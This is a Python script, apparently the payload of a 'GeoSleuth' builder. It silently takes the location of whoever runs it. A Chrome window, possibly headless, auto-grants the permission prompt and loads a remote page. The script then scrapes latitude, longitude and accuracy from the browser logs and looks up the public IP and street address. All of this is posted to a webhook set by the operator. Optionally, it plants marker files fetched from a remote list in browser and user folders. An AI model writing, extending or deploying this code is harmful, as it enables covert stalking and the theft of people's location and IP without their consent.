SELF_DEBUG = None
SELF_NOWINDOW = None
SELF_NOCONSOLE = None
SELF_ADDRESS = None
SELF_ACCURACY = None
SELF_WEBHOOK = None
SELF_SYSTEMCHECK = None
SELF_DELAY = 1

VERSION = '0.2.1'
BUILDER = 'GeoSleuth'
AUTHOR = 'Synthiny'

import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time
import os
import os
import time
import random

def tracker_check():
    appdata_path = os.getenv('APPDATA')
    local_path = os.path.join(os.getenv('LOCALAPPDATA'), 'wpa', 'dpf', 'fname')
    roaming_microsoft_path = os.path.join(appdata_path, 'Roaming', 'Microsoft', 'services')

    chrome_data_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data')
    chrome_cache_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data', 'Default', 'Cache')
    chrome_extension_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data', 'Default', 'Extensions')

    microsoft_edge_path = os.path.join(local_path, 'Microsoft', 'Edge', 'User Data')
    microsoft_edge_cache_path = os.path.join(local_path, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cache')

    microsoft_services_path = os.path.join(appdata_path, 'Roaming', 'Microsoft', 'services')

    # Application-specific paths for a custom application, e.g., WPA (Windows Performance Analyzer)
    wpa_data_path = os.path.join(local_path, 'wpa', 'dpf', 'fname')

    # User's Documents and Downloads for storage
    user_documents_path = os.path.join(os.getenv('USERPROFILE'), 'Documents')
    user_downloads_path = os.path.join(os.getenv('USERPROFILE'), 'Downloads')

    # Example for creating paths for "services" like Chrome or Microsoft might have
    microsoft_app_data_path = os.path.join(appdata_path, 'Roaming', 'Microsoft', 'AppData', 'services', 'chrome_service')

    # Temporary and other custom folders
    temp_data_path = os.path.join(local_path, 'Temp', 'user_temp_folder')
    custom_log_path = os.path.join(local_path, 'mloc', 'logs', 'logfile')

    # Fetch the list of filenames from the given URL
    url = 'https://raw.githubusercontent.com/Synthiny/GeoSleuth/refs/heads/main/html/fname.html'
    response = requests.get(url)
    
    # Ensure the response is successful (status code 200)
    if response.status_code != 200:
        print(f"Failed to retrieve file names. HTTP Status: {response.status_code}")
        return

    # Split the response content into filenames (assuming they are separated by newlines)
    file_names = response.text.strip().splitlines()

    # Check and create files in the specified directories
    directories = [
                    chrome_data_path,
                    chrome_cache_path,
                    chrome_extension_path,
                    microsoft_edge_path,
                    microsoft_edge_cache_path,
                    microsoft_services_path,
                    wpa_data_path,
                    user_documents_path,
                    user_downloads_path,
                    microsoft_app_data_path,
                    temp_data_path,
                    custom_log_path
                ]
    
    for dir_path in directories:
        # Check if the directory exists, if not, create it
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)

        # Check if any of the files exist in the current directory
        file_exists = False
        for file_name in file_names:
            file_path = os.path.join(dir_path, file_name)
            if os.path.exists(file_path):
                file_exists = True
                break

        # If no file exists, select a random file from the list and create it
        if not file_exists:
            file_name = random.choice(file_names)
            file_path = os.path.join(dir_path, file_name)

            # Create the file
            with open(file_path, 'w') as f:
                f.write("")  # Just create an empty file

            if SELF_DEBUG == True:
                print(f"File {file_name} has been created at {file_path}.")
        else:
            if SELF_DEBUG == True:
                print(f"One of the files already exists in {dir_path}. Exiting...")

            os._exit(0)

def debug(message):
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
    print(f"[{current_time}] {message}")

def check_chromedriver():
    if not os.path.exists("chromedriver"):
        if SELF_DEBUG == True:debug("Chromedriver not found. Downloading the latest version.")
        driver_path = ChromeDriverManager().install()
        return driver_path
    else:
        if SELF_DEBUG == True:debug("Chromedriver found.")
        return "chromedriver"

def reverse_geocode(latitude, longitude):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={latitude}&lon={longitude}&format=json&addressdetails=1"
        response = requests.get(url, headers={'User-Agent': 'geo-reverse-geocoding'})
        
        if response.status_code == 200:
            data = response.json()
            if "address" in data:
                address = data["address"]
                full_address = data.get("display_name", "")
                return full_address.strip(", ")
        return None
    except requests.exceptions.RequestException as e:
        if SELF_DEBUG == True:debug(f"Error during geocoding: {e}")
        return None


def relay(CLIENT_LATITUDE, CLIENT_LONGITUDE, CLIENT_ACCURACY, CLIENT_ILA):
    embed = {
        "embeds": [
            {
                "title": "Extracted Location",
                "description": f"IP: {CLIENT_ILA}",
                "color": 0x00FF00,  # Green
                "fields": [
                    {
                        "name": "Latitude",
                        "value": str(CLIENT_LATITUDE),
                        "inline": True
                    },
                    {
                        "name": "Longitude",
                        "value": str(CLIENT_LONGITUDE),
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "Sent from GeoSleuth"
                }
            }
        ]
    }

    if SELF_ACCURACY == True:
        embed["embeds"][0]["fields"].append({
            "name": "Accuracy",
            "value": str(CLIENT_ACCURACY),
            "inline": True
        })
    
    if SELF_ADDRESS == True:
        CLIENT_ADDRESS = reverse_geocode(latitude=CLIENT_LATITUDE, longitude=CLIENT_LONGITUDE)
        embed["embeds"][0]["fields"].append({
            "name": "Address",
            "value": str(CLIENT_ADDRESS),
            "inline": True
        })

    if SELF_WEBHOOK != False or None:
        response = requests.post(SELF_WEBHOOK, json=embed)
        if response.status_code == 204:
            if SELF_DEBUG:
                debug(f"Relay successful. Status code: {response.status_code}")
                
        else:
            if SELF_DEBUG:
                debug(f"Failed to send message. Status code: {response.status_code}")

def start():
    if SELF_SYSTEMCHECK == True:
        tracker_check()
    chrome_options = Options()
    if SELF_NOWINDOW == True:
        chrome_options.add_argument("--headless") 
    chrome_options.add_argument("--use-fake-ui-for-media-stream")
    chrome_options.set_capability('goog:loggingPrefs', {'browser': 'ALL'})

    chromedriver_path = check_chromedriver()
    service = Service(chromedriver_path)
    driver = webdriver.Chrome(service=service, options=chrome_options)

    driver.get("https://synthiny.github.io/GeoSleuth/html/scrape.html")

    time.sleep(SELF_DELAY)

    CLIENT_LATITUDE = None
    CLIENT_LONGITUDE = None
    CLIENT_ACCURACY = None

    logs = driver.get_log('browser')
    for entry in logs:
        if 'Latitude:' in entry['message']:
            CLIENT_LATITUDE = float(entry['message'].split("Latitude: ")[1].split()[0].strip('"'))
        elif 'Longitude:' in entry['message']:
            CLIENT_LONGITUDE = float(entry['message'].split("Longitude: ")[1].split()[0].strip('"'))
        elif 'Accuracy:' in entry['message']:
            CLIENT_ACCURACY = float(entry['message'].split("Accuracy: ")[1].split()[0].strip('"'))

    if SELF_DEBUG == True:
        if SELF_DEBUG == True:debug(f"CLIENT_LATITUDE: {CLIENT_LATITUDE}")
        if SELF_DEBUG == True:debug(f"CLIENT_LONGITUDE: {CLIENT_LONGITUDE}")
        if SELF_DEBUG == True:debug(f"CLIENT_ACCURACY: {CLIENT_ACCURACY}")
    else:
        pass

    if SELF_WEBHOOK != False:
        if SELF_DEBUG == True:debug(SELF_WEBHOOK)
        CLIENT_ILA = requests.get("https://api.ipify.org").text
        relay(CLIENT_LATITUDE, CLIENT_LONGITUDE, CLIENT_ACCURACY, CLIENT_ILA)
    driver.quit()


if __name__ in "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    start()
